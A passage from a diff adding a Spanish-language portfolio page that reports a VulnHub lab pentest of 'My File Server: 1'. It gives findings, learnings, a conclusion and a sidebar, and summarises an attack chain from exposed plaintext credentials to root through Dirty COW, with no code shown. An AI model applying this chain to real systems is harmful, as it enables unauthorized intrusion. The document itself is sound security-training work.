+                    <tr><td>F-05</td><td>Política de contraseñas débil (sin complejidad, mín. 5 caracteres)</td><td>Baja</td><td>Facilita ataques de credenciales</td><td>Endurecer la política de contraseñas</td></tr>
+                  </tbody>
+                </table>
+              </div>
+              <p><small>Severidad según CVSS: Crítico (9.0–10), Alto (7.0–8.9), Medio (4.0–6.9), Bajo (0.1–3.9).</small></p>
+            </section>
+
+            <section class="seccion-actividad" id="aprendizajes" data-aos="fade-up">
+              <h2>Aprendizajes obtenidos</h2>
+              <ul class="lista-objetivos">
+                <li>Practiqué una metodología de pentesting completa y trazable (PTES/OWASP), documentando cada hipótesis, prueba y resultado, incluidos los vectores descartados.</li>
+                <li>Comprendí cómo una sola mala práctica —una credencial expuesta— puede anular controles de seguridad aparentemente sólidos (política de contraseñas, SSH sin contraseña).</li>
+                <li>Reforcé el flujo de post-explotación: de un acceso con privilegios limitados a la escalada total aprovechando una vulnerabilidad de kernel conocida (Dirty COW).</li>
+              </ul>
+            </section>
+
+            <section class="seccion-actividad" id="conclusion" data-aos="fade-up">
+              <h2>Conclusión</h2>
+              <blockquote class="quote">
+                La evaluación demuestra que “My File Server: 1” no es seguro: presenta un nivel de riesgo CRÍTICO, al
+                permitir que un atacante externo y sin credenciales previas logre el compromiso total del sistema
+                hasta privilegios de root. El hallazgo más grave, por su gravedad y por lo evitable que era, fue la
+                exposición de credenciales en texto plano en el sitio web, que anuló por completo el resto de las
+                defensas. El ejercicio evidencia la importancia de la defensa en profundidad: ninguna medida aislada
+                es suficiente, y basta un único eslabón débil para comprometer toda la cadena.
+              </blockquote>
+            </section>
+
+            <nav data-nav-actividad data-parcial="2" data-actividad="13" aria-label="Navegación entre actividades"></nav>
+
+          </div>
+
+          <aside class="actividad-lateral">
+
+            <div class="ficha-lateral">
+              <h2>Datos de la actividad</h2>
+              <ul class="lista-datos">
+                <li>
+                  <span class="etiqueta">Fecha</span>
+                  <span class="valor">01 / 10 / 2026</span>
+                </li>
+                <li>
+                  <span class="etiqueta">Máquina</span>
+                  <span class="valor">My File Server: 1 (VulnHub)</span>
+                </li>
+                <li>
+                  <span class="etiqueta">Tipo de prueba</span>
+                  <span class="valor">Caja negra · Red Team</span>
+                </li>
+                <li>
+                  <span class="etiqueta">Riesgo global</span>
+                  <span class="valor">Crítico</span>
+                </li>
+                <li>
+                  <span class="etiqueta">Entregable</span>
+                  <span class="valor">Informe técnico (PDF)</span>
+                </li>
+              </ul>
+            </div>
+
+            <nav class="ficha-lateral indice-pagina" data-indice aria-label="Índice de la página">
+              <h2>En esta página</h2>
+              <ol>
+                <li><a href="#resumen">Resumen ejecutivo</a></li>
+                <li><a href="#alcance">Alcance</a></li>
+                <li><a href="#metodologia">Metodología</a></li>
+                <li><a href="#reconocimiento">Reconocimiento</a></li>
+                <li><a href="#enumeracion">Enumeración</a></li>
+                <li><a href="#explotacion">Explotación</a></li>
+                <li><a href="#escalada">Escalada de privilegios</a></li>
+                <li><a href="#impacto">Análisis de impacto</a></li>
+                <li><a href="#recomendaciones">Recomendaciones</a></li>
+                <li><a href="#hallazgos">Tabla de hallazgos</a></li>
+                <li><a href="#conclusion">Conclusión</a></li>
+              </ol>
+            </nav>
+
+            <!-- =========================
+                 EDITAR: PDF DE LA ACTIVIDAD
+                 Guarda tu informe completo en: assets/pdf/parcial2/act13.pdf
+            ========================= -->
+            <div class="ficha-lateral tarjeta-descarga">
+              <span class="icono-pdf" aria-hidden="true"><i class="bi bi-file-earmark-text"></i></span>
+              <h3>PDF de la actividad</h3>
+
+              <a class="boton" href="../assets/pdf/parcial2/act13.pdf" download>
+                <i class="bi bi-download" aria-hidden="true"></i>
+                Descargar PDF
+              </a>
+            </div>
+
+          </aside>
+
+        </div>
+      </div>
+
+    </main>
+
+    <div id="footer-container"></div>
+  </div>
+
+  <a href="#" id="subir" class="subir" aria-label="Volver arriba">
+    <i class="bi bi-arrow-up-short" aria-hidden="true"></i>
+  </a>
+
+  <script src="../assets/vendor/aos/aos.js"></script>
+  <script src="../assets/vendor/glightbox/js/glightbox.min.js"></script>
+  <script src="../assets/js/portafolio-data.js"></script>
+  <script src="../assets/js/site.js"></script>
+  <script src="../assets/js/vendor-fallback.js"></script>
+
+</body>
+
+</html>
